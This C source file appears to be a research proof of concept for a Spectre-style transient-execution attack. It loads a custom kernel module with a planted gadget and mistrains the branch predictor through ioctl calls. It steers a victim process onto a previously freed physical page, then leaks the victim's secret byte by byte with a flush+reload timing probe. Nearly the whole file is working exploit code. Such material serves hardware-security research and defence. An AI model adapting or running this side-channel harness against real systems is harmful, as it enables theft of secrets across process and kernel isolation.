#include "common.h"

#include <sys/ioctl.h>
#include <sys/wait.h>

#include "kernel_module/spectre_module.h"

#define PAGES 100000ull
#define SPECTRE_ITERS 80

// page of allocated buffer that will be re-allocated by victim
#define VICTIM_OFFSET 99560

// comment back in to collect statistics on consecutive pages
// #define COLLECT_CONS_STATS

#define flush(x) asm volatile("clflush (%0)" :: "r" (x))
#define mfence() asm volatile("mfence")

uint64_t pfn[PAGES];
uint64_t pfn2[PAGES2];

int module_fd;

static uint64_t probe(void* addr) { // measure access time to addr
    uint64_t a, b;
    
    asm volatile(
        "mfence\n"
        "rdtsc\n"
        "mov %%rax, %[a]\n"
        "mfence\n"
        "mov (%[addr]), %%al\n"
        "mfence\n"
        "rdtsc\n"
        "mov %%rax, %[b]\n"
        : [a] "=r" (a), [b] "=r" (b) : [addr] "r" (addr) : "%rax", "%rdx" 
    );
    return b - a;
}

uint8_t* spectre_buf;

int leak_bit(uint64_t offset_from_buffer, int bit) {
    struct spectre_gadget_params params;
    
    params.user_buf = spectre_buf;
    params.offset = 0;
    params.bit = bit;
    
    int hit;
    
    for(int i = 0; i < SPECTRE_ITERS; i++) {
        params.offset = offset_from_buffer * (i / (SPECTRE_ITERS - 1)); // 4 iterations of in-bounds accesses (-> mistraining) and last one is out-of-bounds
        flush(&spectre_buf[0]);
        flush(&spectre_buf[256]);
        mfence();
        ioctl(module_fd, CMD_GADGET, &params);
        mfence();
        hit = probe(&spectre_buf[256]) < probe(&spectre_buf[0]);
    }
    
    return hit;
}

int leak_byte(uint64_t offset_from_buffer) {
    int res = 0;
    for(int i = 0; i < 8; i++) {
        res |= leak_bit(offset_from_buffer, i) << i;
    }
    return res;
}

int main(int argc, char** argv) {
    init();
    
    // setup spectre stuff
    system("rmmod spectre_module; cd kernel_module && make; insmod spectre_module.ko");
    uint64_t buf_addr;
    module_fd = open(SPECTRE_MODULE_DEVICE_PATH, O_RDONLY);
    if(module_fd < 0) {
        fputs("unable to open module!\n", stderr);
        return -1;
    }
    spectre_buf = mmap(NULL, PAGE_SIZE * 3, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_POPULATE | MAP_PRIVATE, -1, 0);
    memset(spectre_buf, 5, PAGE_SIZE * 3);
    spectre_buf += PAGE_SIZE;
    ioctl(module_fd, CMD_INFO, (unsigned long)&buf_addr);
    printf("kernel buffer: 0x%zx\n", buf_addr);
    
    int working_runs = 0;
    
    for(int i = 0; i < REPEATS; i++) {
    
        // allocate a few pages
        uint8_t* buf = mmap(NULL, PAGE_SIZE * PAGES, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_POPULATE | MAP_PRIVATE, -1, 0);
        memset(buf, 5, PAGE_SIZE * PAGES);
 
        
        // find physical addresses (and collect some statistics)
        #ifdef COLLECT_CONS_STATS
        int cons = 0;
        int max_cons = 0;
        uint64_t last_pfn = 0;
        #endif /* COLLECT_CONS_STATS */
        for(int j = 0; j < PAGES; j++) {
            pfn[j] = virt2phys_attack(&buf[PAGE_SIZE * j]);
            #ifdef COLLECT_CONS_STATS
            last_pfn += PAGE_SIZE;
            if(pfn[j] == last_pfn) {
                cons ++;
            } else {
                last_pfn = pfn[j];
                if(cons > max_cons) {
                    max_cons = cons;
                }
                cons = 0;
            }
            #endif /* COLLECT_CONS_STATS */
        }
        #ifdef COLLECT_CONS_STATS
        if(cons > max_cons) {
            max_cons = cons;
        }
        printf("max cons: %d\n", max_cons);
        #endif /* COLLECT_CONS_STATS */
        
        // free allocated pages
        madvise(buf, PAGE_SIZE * PAGES, MADV_REMOVE);
        munmap(buf, PAGE_SIZE * PAGES);
        
        usleep(100000);
        // start victim (which will hopefully re-allocate the correct page that was previously freed)
        int pid = fork();
        int status;
        if(!pid) {
            // child
            execv("./victim", argv);
            exit(0);
        }
        
        // wait for victim to write secret
        usleep(100000); 
        
        // leak secret from victim
        uint64_t target = pfn[VICTIM_OFFSET] - buf_addr;
        
        // printf("target: %p -> %p\n", (void*)target, (void*)(target + buf_addr));
        int working = 1;
        for(int j = 0; j < 20; j++) {
            working = working && leak_byte(target + j) == 0x31;
        }
        working_runs += working;
        
        // print some information about pages the victim allocated
        
        for(int j = 0; j < PAGES2; j++) {
            uint64_t pf = shared_mem[j];
            for(int k = 0; k < PAGES; k++) {
                if(pf == pfn[k]) {
                    printf("a = %d, b = %d: 0x%zx 0x%zx\n", k, j, pf, pfn[k]);
                }
            }
        }

        // wait for victim to stop so we can go for another round
        waitpid(pid, &status, 0);
    }
    close(module_fd);

    system("rmmod spectre_module");
    
    fprintf(stderr, "working: %d / %d\n", working_runs, REPEATS);
    return 0;
}
